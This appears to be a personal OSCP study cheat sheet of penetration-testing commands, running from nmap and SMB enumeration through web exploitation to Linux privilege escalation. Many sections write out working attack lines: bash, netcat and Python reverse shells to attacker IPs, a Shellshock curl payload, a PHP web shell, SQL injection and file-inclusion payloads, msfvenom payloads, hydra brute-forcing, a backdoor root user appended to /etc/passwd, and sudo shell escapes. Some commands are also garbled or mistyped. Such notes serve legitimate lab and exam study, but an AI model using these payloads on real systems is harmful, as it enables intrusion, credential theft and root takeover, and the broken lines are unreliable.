PERSONAL OSCP NOTES ~Kunal Patel
==-==-==-==-==-==-==-==-==-==-==

Cyberchef --> website that allows decoding and encoding of various stuffs like ssh(RSA,cipher),jpg etc
https://obsproject.com/ --> to capture the screen while exam

====
Nmap
====
nmap -A -p- -T4 192.168.6.145
nmap -sV 192.168.20.10-12 -oA bookversionnmap
nmap -sS -T4 -A [IP]
nmap -sS -sC -sV -Pn -T4 -vv 192.168.6.137
nmap -sT -sV -A -O -v -p 1-65535 192.168.1.24
nmap -T4 -sS -sV -sC -Pn
(-A = -O + -sV + -sC + --traceroute)

Stealth Scan -sS
Script SCan  -sC
Version Scan -sV
Ping Scan    -sn
TCP Scan     -sT
UDP Scan     -sU       
FIN Scan     -sF        
(-sF Finished Scan)- Used to send finished message to server so firewall would think
 you are already talking with the server and allows you in to finish your talking)

Always Use Autorecon.py :)

====
tmux
====
Learning tmux is handy and important and it saves your time
Start tmux by typing tmux in terminal
	Prefix key: ctrl + b
	Open new pane Prefix c
	Open new pane in same window
		Horizaontally: prefix + %
		Vertically: prefix + "
	Rename the window : prefix  ,
	Search the window : prefix (ctrl + s)
		press q to quit search
	Scroll through pane: prefix [ then arrow keys
	tmux ls
	tmux new-session
	Detach session	
		prefix d
	tmux attach-session -t 0

====================
HTTP(80) enumeration
====================
go to website and view source code
 
Check for /robots.txt

using dirbuster
	dirb http://192.168.6.139
	dirb http://192.168.6.139 -X .php
	dirb http://192.168.6.139 -X .txt
	dirb http://192.168.6.139 -X .html

or gobuster 
	gobuster dir -u http://<ip>:<port> -w <word list location>
		GoBuster flag			Description
		--------------         -------------
			-e						Print the full URLs in your console
			-u						The target URL
			-w						Path to your wordlist
			-U and -P				Username and Password for Basic Auth
			-p <x>					Proxy to use for requests
			-c <http cookies>		Specify a cookie for simulating your auth
			
then nikto -h 192.168.6.141
     nikto -host=http://www.megacorpone.com -maxtime=30s
		- Nikto v2.1.6
		---------------------------------------------------------------------------
		+ Target IP: 38.100.193.76
		+ Target Hostname: www.megacorpone.com
		+ Target Port: 80
		---------------------------------------------------------------------------

SPARTA and autorecon.py are recon automators.

---------------------
Exploiting PUT method
---------------------
Curl, Cadaver, nmap, Poster(firefox-addon), Burpsuit, Metasploit....
all of these can be used to upload reverse_shell on to the victim machine.

Firest check what file types are allowed on server using devtest
	davtest -url http://10.10.10.14

Curl is Command line tool 
	curl http://192.168.6.103/dav/ --upload-file /root/Desktop/shell.php -v

Cadaver is a tool pre-installed in kali that enables uploading & downloading of a file on WebDAV.
	ON KALI
		cadaver http://victim_ip/
		put /root/Desktop/Rev_shell.php

Nmap can also upload malcious file to the remote server	
	nmap -p 80 192.168.6.103 --script http-put --script-args http-put.url='/dav/shell.php' ,http-put.file='/root/Desktop/shell.php

Poster is a firefox addon for interacting with web services which can be used to trigger HTTP request parameters like
GET,POST,PUT and DELETE.

	Install the Poster add-on in firefox
	From there it is GUI-based :P
	
Burpsuit is proxy-interception tool, and using it to send PUT request is also easy
	Turn intercept on
	and add "PUT /dav/rev_shell.php HTTP/1.1" in the header and then paste the malicious code within the request but as the body
	
Metasploit has built-in aux module to PUT file
	msf> use auxiliary/scanner/http/http_put
	msf>auxiliary (http_put) > set rhosts 192.168.6.103
	msf>auxiliary (http_put) > set payload php/meterpreter/reverse_tcp
	msf>auxiliary (http_put) > set path /dav/
	msf>auxiliary (http_put) > set filename shell.php
	msf>auxiliary (http_put) > set filedata file://root/Desktop/meter.php
	msf>auxiliary (http_put) > exploit
	
=======================
https (443) enumeration
=======================
Read the actual SSL CERT to:
	- find out potential correct vhost to GET
	- is the clock skewed
	- any names that could be usernames for bruteforce/guessing.

sslscan 10.11.1.111:443
./testssl.sh -e -E -f -p  -S -P -c -H -U TARGET-HOST > OUTPUT-FILE.html
nmap -sV --script=ssl-heartbleed 192.168.101.8

===========
Login-Panel
===========
Always try with default creds first admin:nibles,admin:password,admin:{Site_name} root:root, admin:admin etc
Logged-in or not, also try in ssh with user root or any other
Try sql injections
If username is valid but password invalid use hydra to bruteforce
	hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 -V -f http-post-form '/department/login.php:username=^USER^&password=^PASS^:invalid password'
Try to find unauthenticated exploit 

===========
Jenkins CMS
===========
jenkins server has /script open which allows java code execution 
one can easily get a reverse shell using this 
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
in /script


===============
base 64 stuffs
===============
base64 kunal.txt        (It will encode the contents of file)
base64 -d kunal.txt

echo -n asasasasassadasdasdasdas= | base64 -d

echo -n asasasasassadasdasdasdas= | base64 -d | wc -c (WORD COUNT FOR asasasasassadasdasdasdas=)
	25

==============
DNS Resolution 
==============
nslookup  www.google.com

dig axfr @192.168.6.136 kioprio.com
dig axfr @192.168.6.136 kioprio.com > zonetransfer  (For saving the output into zonetransfer file)

host -l cronos.htb 10.10.10.13

dig axfr @192.168.6.136 kioprio2.com
dig axfr @192.168.6.136 kioprio2.com >> zonetransfer (For appending/updating the same file we use double >> )

dig @10.10.176.179 bookface.com -t TXT
	to find flag2 with TXT header 

dig -x <host> # reverses lookup host

==========================================
Automating websites checking from dns res
========================================== 

create a file named websites and enter 
	http://kio1.com
	http://b1.kio2.com
	http://kio3.admin.com
	http://administrator.kio1.com

now to check all of those websites at once automatically unless doing it manually type

cat websites | aquatone

And aquatone would go to all websites and would screenshot them, so we get to know which are real and which are fake websites.

=====================
Find running Services
=====================
netstat -plnt

======================================================
SMB & NFS {Server Message Block & Network File System}
======================================================
SMB & NFS are client-server communication protocols used for sharing access to files, printers, serial ports and other resources on a network.

Samba is used for sharing linux file to windows network.
Nfs is used to share all the file system on network.

Windows does not support NFS. So if there is atleast one windows machine in a network then samba must be used for file transfers between linux & windows.
If all are unix machines in a network then NFS must be used. It shares filesystem between unix platform alone.
Samba is an open-source implementation of the System Message Block (SMB) service used by Microsoft Windows 9xand NT, which is sometimes known as Common Internet File System (CIFS)

NFS (Network file system) is a file sharing protocol which is native to Unix/Linux systems.
Samba is a piece software which adds SMB/CIFS filesharing protocol to Linux/Unix. 
CIFS (Common internet file sharing) is filesharing protocol which is native to windows.

In short
NFS is used------> Only Linux systems in a server
SMB is used------> Linux and WIndows both in server

===================== 
SMB(Samba) enumeration
===================== 
Samba is contained in three packages:
*)samba-common, which contains files needed by Samba clients and servers
*)samba, which contains the Samba server
*)samba-client, which contains the Sambasmbclient,smbmount,and smbprint programs and associated files and documentation


smbmap is used to list out open directories and it's permissions
smbclient is used to connect to those open directories 

Bruteforce smb using hydra
--------------------------
hydra -t 1 -V -f -L username.txt -p "Welcome123!" 10.10.10.169 smb

List Open Directories
---------------------
smbmap -H 192.168.6.136
smbmap -H 192.168.6.136 -R --depth 5 ( -R Recursively list directories, --depth 5 Traverse a directory tree to a specific depth)
smbmap -H 192.168.6.135 -u admin -p password

Connect to open Directories
---------------------------
smbclient //192.168.6.136
smbclient //192.168.6.136/(directory/disk_name)
	> get s33cret.txt
	> exit
cat s33cret.txt

smbclient -L //192.168.6.136 ({-L} And it will list directories with comments)

smbclient --no-pass //10.10.10.178/Data 

smbclient -U admin //192.168.6.136/(directory/disk_name)
	Enter admin's password: admin123
	> put reverse_shell.php
	> exit


To save everythig from smb share to KALI	
smb: \> recurse on
smb: \> prompt off
smb: \> mget *


smb Server
----------
To create a smb server share named kali 
	sudo impacket-smbserver -smb2support kali `pwd`
it will make a share named kali in your kali with pwd (eg:Desktop or whatever you r in)

To connect to your kali share form victim (Dns admin Priv esc)
	dnscmd Resolute /config /serverlevelplugindll \\10.10.15.45\kali\privesc.dll

==========
enum4linux
==========
Scan everything
	enum4linux -a 10.11.1.111
	
To list usernames 
	enum4linux -U 10.10.10.182
	
====================================================
NFS (Network File System) open mount vuln (port 111)
====================================================
showmount -e 192.168.6.154
or
showmount --exports 192.168.6.146
	Export list for 192.168.6.146:
	/home/shivay *
	
as we can see vulnerable NFS /home/shivay can be mounted to our kali machine
First make a folder in which to mount the /home/shivay
In kali
mkdir /tmp/shivaytmp
mount -t nfs 192.168.6.146:/home/shivay /tmp/shivaytmp  (where -t means type)

And now we can copy our reverse_shell to mounted nfs
Copy reverse_shell.php to /tmp/shivaynfs

Now access reverse_shell 
http://192.168.6.146/nandi.php?file=/home/shivay/reverse.php

What ever we upload into mounted NFS, it get's uploaded into actual NFS

=============================================
Download files within meterpreter/reverse_tcp
==============================================

Sometimes there comes times where you are in msfconsole's meterpreter/reverse_tcp shell and you need
to download files from victim machine to kali

	meterpreter > download \openssh.gzip /root/Desktop/

===========================
SNMP Enumeration (PORT 161)
===========================
snmp is common in windows machines

snmpwalk -c public -v2c 10.10.10.116
snmpwalk -v 2c -c public 10.10.10.116
snmp-check 10.10.10.116
snmp-check 10.11.1.111 -c public|private|community
nmap -sU -p 161 --script snmp-win32-services 10.10.10.116
nmap -sU -p 161 --script snmp-win32-users 10.10.10.116
nmap -sU -p 161 --script snmp-brute 10.10.10.116 
nmap -vv -sV -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111
onesixone 

===============
LDAP (port 389)
===============
Search for default naming context in LDAP
	ldapsearch -h 10.10.10.182 -x -s base defaultNamingContext

We get the default naming context
	defaultNamingContext: DC=cascade,DC=local
	
So now we can use defaultNamingContext with ldapsearch
	ldapsearch -h 10.10.10.182 -x -b "dc=cascade,dc=local" > ldapsearch.txt
	
	cat ldapsearch.txt | grep Pwd
			And we get the stored Password from the ldap scan 
			(Open it using text editor and search again and u get username as well)


nmap enum for ldap
-------------------
	nmap -n -sV --script "ldap* and not brute" 10.10.10.193 
	nmap -p 389 --script ldap-brute --script-args ldap.base='"CN=FUSE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=fabricorp,DC=local"' 10.10.10.193

also use enum4linux to grab usernames and other important information

==========
Shellshock
==========
Let's say we found a file user.sh on victim's server under cgi-bin, 
which is vulnerable to shell shock attack
We can get a reverse_shell using metasploit 
	"use exploit/multi/http/apache_mod_cgi_bash_env_exec"
Or without metasploit by using CURL
	curl -A '() { :; }; /bin/bash -i > /dev/tcp/10.10.14.14/9000 0<&1 2>&1' http://10.10.10.56/cgi-bin/user.sh

===========
finger (79)
===========
nmap --script finger -p79 10.10.10.116
finger sshd@10.10.10.116

==========
RDP (3389)
==========
Check if guest login allowed
	rdesktop -u guest -p guest 10.11.1.111 -g 94%
	
To login inside Rdp use rdesktop or xfreerdp
	rdesktop -u Kunal -p Patel -g 85% -r disk:share=/root/ 10.11.1.111
	rdesktop -u Kunal -p Patel 10.11.1.111 -g 94%
	xfreerdp /u:Kunal /p:Patel /v:10.10.2.138

=============
ssh (port 22)
=============
Login to ssh
	ssh root@10.10.10.16

Login to ssh via private key
	ssh -i id_rsa user@10.10.10.146
	 (Also it might ask for passphrase, use ssh2john and crack it) 
	 to copy id_rsa from user (You need access to user :p)
		copy from /home/root/.ssh/id_rsa (But for that we first need the access to victim to steal the private key :)
	
Bruteforcing the ssh
	hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.6.151 ssh -t 4
		-l is the user name 
		-P is the word file
			~Use -L for user.txt file
		
Copying Files from ssh shell
	Suppose there is a file inside victim machine name user.jpg which u need to copy to kali via ssh then use
		On Kali
		scp -i id_rsa willow@10.10.154.10:user.jpg flag.jpg	
			~~It saves user.jpg from victim machine to flag.jpg in kali	

If ssh runs on other port (like 920)
	ssh -p 920 kunal@10.10.10.10
	
If ssh is filtered by a proxy lets say on port 3128 run this on kali
	proxytunnel -p {Victim_IP}:3128 -d 127.0.0.1:22 -a 1234
	Now connect using ssh
		ssh john@127.0.0.1 -p 1234

- If you have usernames test login with username:username
- Vulnerable Versions: 7.2p1
```
nc 10.11.1.111 22


=================
SSH Port knocking
=================
On Victim 
	cat /etc/knockd.conf
	to find out how to open and close ssh, but you need an initial shell
	if found 
	[openSSH]
	sequence = 571, 290, 911
		Use nmap to scan in order to unlock (OPEN) ssh
		for x in 571 290 911 22; do nmap -Pn --max-retries 0 -p $x 10.10.10.43; done
If you do nmap scan in reverse order (22 911 290 571) It Locks the SSH port again
	
===========
SMTP (25)
===========
nc -nvv 10.11.1.111 25
HELO foo<cr><lf>

telnet 10.11.1.111 25
VRFY root

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111
smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111


==============
 Kerberos (88)
==============
- MS14-068
- GetUserSPNs

======================
Evil-winrm (Port 5985)
======================
To connect to victim
	evil-winrm -u Username -p 'Password' -i RHOST

To see hidden files
	ls -hidden
	
=============
FTP (Port 21)
=============
Ftp anonymous login allowed

	ftp 10.10.16.69
	name: anonymous
	ftp:> dir
	ftp: bind: Address already in use
		if this bind alreadeyin use error occurs open ftp in passive mode
	ftp -p 10.10.16.69

	If nothing shows maybe file is hidden use
	ftp:> ls -lah
	
	To Download file from ftp to kali
	ftp:> mget file.txt
	
Bruteforce FTP with user jerry
	hydra -l jerry -P /usr/share/wordlists/rockyou.txt 10.10.176.179 ftp


=========================
Creating Salted Password
=========================
There may be times where /etc/passwd file is editable
And you may wanna add your own root user with password 
So here is how to generate a password

	openssl passwd -1 -salt kunal patel

And it will create a user name kunal with password patel

kunal:$xxxxxxxxxxxxxxxxxxx:0:0:root:/root:/bin/bash                   (where xxxxx is encrypted password)
kunal:$1$kunal$WNZN7hI3wo2fKty5US.q40:0:0:root:/root:/bin/bash

# to create a second root user with "mrcake" password
echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd

========
exiftool
========
First try to run strings even on image
then use exiftool
exiftool is a tool that extracts metadata from images
binwalk is also a tool that extracts data from images	
	If theres a zip file inside a image
		use: binwalk -e image.jpg
		And it will extract zip file inside a "_xxxx" Folder
	
steghide info irked.jpg
steghide extract -sf irked.jpg -p 
	
=============
SQL INJECTION
=============
 User Login & password:   
         
		'
		' or '1'='1
		' || 1=1# 
		admin' #
		admin' or '1'='1
		%' or '0'='0
		
### Sql-login-bypass
--------------------
		- Open Burp-suite
		- Make and intercept a request
		- Send to intruder
		- Cluster attack.
		- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
		- Attack
		- Check for response length variation
			

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'-- 

' UNION SELECT username, password FROM users-- 
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--

'+UNION+SELECT+BANNER,+NULL+FROM+v$version--



======================
Padding oracle attack
======================
If you login to a website, and that website has a cookie.
You try changing the cookie value and invalid padding error occurs
Then u can use padbuster tool to get the cookie of admin
https://exp1o1t9r.com/2020/01/31/hackthebox-lazy-writeup/

=============
REVERSE SHELL
============= 
attacker(host)          nc -nvlp 4444


First upload 
	<?php echo system($_REQUEST["cmd"]); ?> as rev.php
Then execute
	rev.php&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.14+920+>/tmp/f


http://kioptrix3.com/index.php?page=index%27);${system(%27nc%20-e%20/bin/sh%20192.168.6.134%204444%27)};%23


if found PING SEARCHBOX in website then use below command to get reverse shell
	; bash -i >& /dev/tcp/192.168.6.148/4444 0>&1
	or
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 5555 >/tmp/f
 

====================
LOCAL FILE INCLUSION
==================== 

Basic file inclusion: xxx.php?language=/etc/passwd             (../) or simply (/)
Null byte inclusion: xxx.php?language=/etc/passwd%00           (%00) or (%00jpg)
Base64 encoded inclusion: xxx.php?language=php://filter/read=convert.base64-encoded/resource=/etc/passwd
					      http://192.168.6.147/?page=php://filter/convert.base64-encode/resource=config

replace language by page,system,file,input,etc


TO ENUMERATE USERNAMES (..search for /home/xxx :/usr/bin   where xxx is username in passwd file) 

http://192.168.x.x/index.php?system=../../../../../../etc/passwd%00jpg
http://192.168.x.x/index.php?system=../../../../../../etc/passwd
http://192.168.x.x/connect.php?file=../../../../../../etc/passwd
http://192.168.x.x/connect.php?file=/etc/passwd
http://192.168.6.146/nandi.php?file=/home/shivay/reverse.php

http://192.168.6.147/?page=php://filter/convert.base64-encode/resource=index
http://192.168.6.147/?page=php://filter/convert.base64-encode/resource=config
http://192.168.6.147/?page=php://filter/convert.base64-encode/resource=upload
php://filter/convert.base64-encode/resource=/var/www/html/backup.forwardslash.htb/dev/index.php

# LFI Windows
http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00
-------------------------------------
Local File inclusion bypass using ext
-------------------------------------
A site that gives output of dogs pic
	http://10.10.90.167/?view=dog
Doing
	http://10.10.90.167/?view=../../../etc/passwd
Get error : only dogs are allowed
So doing
	http://10.10.90.167/?view=dog)../../../etc/passwd
Get error : file not found
So that means it appends everything to .php so to bypass this .php appending at the end use "ext"
	http://10.10.90.167/?view=dog)../../../etc/passwd&ext=
we get the etc/passwd
	Now do Apache Log Poisoning through LFI to get a shell
	
-----------
PHP wrapper
-----------
We can use the data280 wrapper to embed inline data as part of the URL with plaintext or base64281
encoded data. This wrapper provides us with an alternative payload when we cannot poison a local
file with PHP code. (can also gain a shell {RFI} using wrapper)

		/menu.php?file=data:text/plain,hello world
		/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
		
		
Upoad a fake file
-----------------
If server allows only pdf files to be uploaded use %PDF header like:
--------------------------------------------------------------------
	%PDF-1.4
	<?php	
		system($_GET["cmd"]);
	?>
and save it as shell.pdf 
http://192.168.6.136/index.php?page=uploads/shell.pdf%00&cmd=whoami


If server allows only .jpg files to be uploaded insert reverse shell into metadata of an image
-----------------------------------------------------------------------------------------------
	Upload any image file with xx.php.jpg/xx.jpg.php extension.
	Fire up burpsuit and change file type to image/php (This step Not necessary )
	And using burpsuit remove middle contents of image and add reverse shell php contents.
	Also check param tab in burpsuit to make sure it's not leaking reverse shell contents.
			Eg:
				Server allows image upload
				Upload image with name bird.php.jpeg 
				 Go to burp 
				 Change middle content of image with php reverse shell
				 
				 set up nc listner on kali
				 
				 then execute the image and get the shell
				in this case it is
				
				 10.10.10.185/image/uploads/bird.php.jpeg 


Getting Revershell
--------------------
Upload a reverse_shell file into vuln server 
 and connect to it
	For eg:
		http://192.168.x.x/connect.php?file=/uploads/reverse.php

=====================
REMOTE FILE INCLUSION
===================== 
Always upload echo file first on remote system to make sure it works 
<?php
echo("Hello kunal");
?>
save it as test.php, upload it
http://192.168.6.138/connect.php?file=http://192.168.6.141/test.php


And if it works then use reverse shell php
http://192.168.x.x/connect.php?file=http://192.168.6.141/reverse.php

One liner reverse shell (URL encoded reverse shell)
http://kioptrix3.com/index.php?page=index%27);${system(%27nc%20-e%20/bin/sh%20192.168.6.141%204444%27)};%23


--------
msfvenom
--------






Now to create 
Reverse Shell payload using msfvenom 
		msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.6.146 LPORT=4444 >> exploit.php

		now open msfconsole to set a listener like netcat for our msfvenom payload

		msfconsole
		use exploit/multi/handler
		set LHOST [kali_ip]
		set LPORT [4444]
		set payload php/meterpreter/reverse_tcp
		exploit

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 EXITFUNC=thread -f asp > rev.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.38 LPORT=4444 -f asp > shell.asp

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp

=====
zico2
=====
python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.6.154%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27


========================
ISRO mahine walkthrough
========================
http://192.168.6.139/connect.php?file=http://192.168.6.141/reverse.php
vi /etc/passwd
su root
mysql -u root
show databases;
use flag;
show tables;
select * from flag;

=================
Windows 7 SP1 x64
=================
=============
Eternal blue
=============
nmap --script smb-check-vulns.nse -p445 192.168.206.136

nmap -p 445 --script "vuln and safe" -Pn -n 10.10.10.178
metasploit 
use windows/smb/ms17_010_eternalblue)

use post/multi/manage/shell_to_meterpreter
	meterpreter> getsystem
	meterpreter> ps
	meterpreter> migrate {PID}    (Usually powershell or cmd should work but any NT Authority will work)
	meterpreter> hashdump
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
	
Copy these hashdumps in hash file and use john to crack it

john hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt 

WITHOUT Metasploit

https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
	python3 send_and_execute.py 10.10.10.4 exploit.exe	
		Where exploit.exe can be generated by msfvenom
		
	
===========================
Cracking .zip .7z .rar fles
===========================
sudo snap install john-the-ripper
In order to crack these password protected files. 
Firstly we need to find out it's password hash from the compressed file. 
Use github scripts like rar2john to extract the hash and then crack it using john 


zip2john  encrypted.zip < encrypted.hash$
rar2john  encrypted.rar < encrypted.hash$
7z2john   encrypted.7z < encrypted.hash$

then use
john --wordlist=/usr..../rockyou.txt encrypted.hash$
john --show encrypted.hash$

OR

FCrackZip by Marc Lehmann is also a free and fast zip and 7-zip password cracker.
sudo apt-get install fcrackzip
RarCrack by David Zoltan Kedves is a simple bruteforce zip,7-zip and rar password cracker.
sudo apt-get install rarcrack

If found an encrypted cipher message use rumkin to decrypt
	rumkin.com/tools/cipher

crackstation.net
hashes.com

https://hashkiller.co.uk/Cracker
https://www.cmd5.org/
https://www.onlinehashcrack.com/
https://gpuhash.me/
https://crackstation.net/
https://crack.sh/
https://hash.help/
https://passwordrecovery.io/
http://cracker.offensive-security.com/

hashes.org

====================
WORDPRESS BRUTEFORCE
====================
hydra -l kunal -P /usr/share/wordlists/rockyou.txt 10.10.10.x http-post-form "/wp-login.php:log=kunal&pwd=^PASS^:ERROR

Enumerate full wordpress site
-----------------------------
wpscan --url http://wordy/

If wordpress site is on port 443
 wpscan --url https://wordy/ --disable-tls-checks
 
Enumerates Users on Site 
-----------------------
wpscan --url http://wordy/  --enumerate u

Bruteforcing WPSCAN giving password file and user list
-------------------------------------------------------
sudo wpscan --url http://wordy/ --passwords /home/kali/Desktop/kpasswords.txt --usernames /home/kali/Desktop/users.txt 

wpscan --url http://192.168.0.18 --wordlist=/root/Downloads/fsocity.dic --username elliot

wpscan --url http://192.168.6.145 -P /root/Downloads/fsocity.dic -U elliot

wpscan --url http://wordy/ --password-attack wp-login

==========
pop3 (110)
==========
Use thunderbird mail client to login
	Open ThunderBird -> Add Email -> Login
	
	
===========
james (4555)
===========
login default as root:root via nc
	nc [VICTIM_IP] 4555
listusers
change users password
then use pop3 as a user to check mails

============
mysql (3306)
============
to access mysql remotely ->
mysql -u root -h 192.168.6.147 --password=H4u%QJ_H99
OR
mysql --user=root --password=toor --host=192.168.6.147

or locally ->
mysql -u root
OR
mysql -u root -p toor
OR
mysql -u root -p
	Enter password:

show databases;      <-------It just lists all databases installed
use flag;       <------Selects the database named flag
show tables;         <---------Shows all the tables inside that flag database
select * from key;   <----------- Shows everything from that key table


if 3306 running and mysql not found
try other mysql services
	like mysqladmin
		sqli
		mysqldump --databases Magic -u theseus -p
		etc
		
=======================
POWERSHELL Exploitation
=======================	

=================
Shell Restriction
=================
restricted shell

ssh mindy@10.10.10.51 
password:
Welcome
mindy@swag:cd ..
-rbash: sudo: command not found 

Login as
ssh mindy@10.10.10.51 'bash -–noprofile'
to get shell escape

https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=9

================
priv escalation
================
	Via kernel exploits
	Exploiting services which are running as a root
	Exploiting SUID Executables
	Exploiting SUDO rights/user
	Exploiting badly configured cron jobs
	Exploiting users with '.' in their PATH

- Installed software
- Weak/reused/plaintext passwords
- Inside service
- World writable scripts invoked by root
- Unmounted filesystems
- Look in /var/backups or /backups (if any readable file present)
- Look in /etc/fstab y en mount
Less likely
- Private ssh keys
- Bad path configuration
- Cronjobs
- Look in /var/html/{SERVICE} (any service running might be vulnerable so search on exploit-db)

netstat -antp   (Shows which ports/ip machine is listening to)
netstat -ano
ps -aux | grep root
ls -la on etc/passwd or etc/shadow

uname -a (to get full kernel version)
sudo -l (shows what current user can execute as root)
	sudo -u robert -u root cat /root/root.txt (bypass -u user restriction by appending another user)
	sudo -u scriptmanager /bin/bash

Distribution information is in
	- etc/release
	- etc/issue*
	
Run ltrace command against any setuid and setgid programs found
Look for setuid programs with:
	find directory -user root -perm -4000 -exec Ls -ld {} \; >/tmp/gaping-security-hole
	
----------------
kernel exploits
----------------
Pre compiled kernel exploits
	https://github.com/lucyoa/kernel-exploits
		~Dirtycow & rds
		
Weak permissions on LD_PRELOAD (LINUX) DLL_SIDELOAD(WINDOWS)

TO FIND EXECUTABLES WHICH HAVE SUID BIT SET USE
	find / -perm -u=s -type f 2>/dev/null

FIND CRON TABS
-------------
	cat /etc/crontab
	also run pspy would help

linpeas.sh
linuxprivchecker.py     linPrivchecker.sh     Linexploitchecker.sh

Also use "pspy github" to check every running process on machine every sec (usefull for finding cron processes)

Create files with any name on linux-shell-escaping-techniques/
	touch ./myanynamefile
	
-------------------------------------
Gaining ROOT with PATH vulnerability
-------------------------------------
suppose sysinfo running as root and it executes fdisk without path
export PATH=/tmp:$PATH

create a fdisk file having python rev shell and mv it to /tmp 
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.246",920));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

Set up another nc listner on 920 and u r root


Another example of gaining root via PATH vulnerability is using python library hi-jacking
-----------------------------------------------------------------------------------------
let's say a backup.py python file is running some python script as root every few minutes
and it imports few libraries like
	import os
	import zipfile 
	print("hey there KIDS :P")
	etc
So we can take advantage of it by creating a zipfile.py or os.py in the same directory containing our python reverse shell.
So now when backup.py runs it imports our os.py and zipfile.py instead of loading from actual library as it is in the same folder 
giving us the reverse shell as root.


# SUID
---------
find / -perm -4000 -type f 2>/dev/null
find / -uid 0 -perm -4000 -type f 2>/dev/null

# ALL PERMS
------------
find / -perm -777 -type f 2>/dev/null

# SUID for current user
-------------------------
find / perm /u=s -user `whoami` 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null

# Writables for current user/group
-----------------------------------
find / perm /u=w -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
find / -perm /u+w -user `whoami` 2>/dev/nul

# Dirs with +w perms for current u/g
-------------------------------------
find / perm /u=w -type -d -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null

-------------
MOTD Priv esc
-------------
While logging into an ssh if MOTD(Message Of The Day) found (Header)

In VICTIM
Go to /etc/update-motd.d/ and type following
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.66 420 >/tmp/f" >> 00-header 

Now wait on nc -nvlp 420

This was the reverse shell from pentest monkey ;)

--------------------
Gaining root via zip
--------------------
If sudo -l shows user can execute zip as a root
create a kunal.zip file inside /tmp
	sudo zip /tmp/kunal.zip /tmp/ -T --unzip-command="sh -c /bin/bash"
and you are root

-----------------------------
If systemctl has SUID bit set
-----------------------------
run this (Gtfobins)
	TF=$(mktemp).service
	echo '[Service]
	Type=oneshot
	ExecStart=/bin/sh -c "chmod +s /bin/bash"
	[Install]
	WantedBy=multi-user.target' > $TF
	/bin/systemctl link $TF
	/bin/systemctl enable --now $TF

	now run /bin/bash -p
	id
	and ur root

-------------------------------
Sudo -l (find,python,cat,mysql)
-------------------------------
sudo find /home -exec sh -i \;
sudo python -c 'import pty;pty.spawn("/bin/bash");'
sudo cat /etc/shadow (:P and use john to crack password)
sudo mysql -e '\! /bin/sh'

-----------------
Sudo -l (/bin/su)
-----------------
If /bin/su is allowed to run as root with No password
	Then what else do u need in life man
		sudo /bin/su root

------------------------------------------------------------------------------
Sudo -l (ftp,expect,env,ed,perl,socat,less,man,git,pico,scp,ssh,curl,vi,rvim,)
------------------------------------------------------------------------------
FTP
	sudo ftp
	!/bin/bash
	id
EXPECT
	sudo expect -i
ENV
	sudo env /bin/bash
ED
	sudo ed
	!/bin/bash
PERL
	sudo perl -e 'exec "/bin/bash";'
SOCAT
	ON VICTIM
	sudo socat exec: sh -li' ,pty,stderr,setsid,sigint,sane tcp:kali_ip:1234
	ON KALI
	socat file:'tty' ,raw,echo=0 tcp-listen:1234
LESS
	sudo less /etc/hosts (It opens file in VI mode, so executing !bash command inside it would get root shell)
	!bash
MAN
	sudo man /etc/hosts (again It opens file in VI mode, so executing !bash command inside it would get root shell)
	!bash
GIT
	sudo git help status
	!bash
PICO
	Pico is the text editor same as nano and vi, so additionally u can also edit the /etc/passwd to add new root user
SCP
	It can be used to break out from restricted environments
		
		hack=$(mktemp)
		echo "/bin/bash 0<&2 1>&2"> $hack
		chmod +x "$hack"
		sudo scp -S $hack abc abd;
		id
SSH
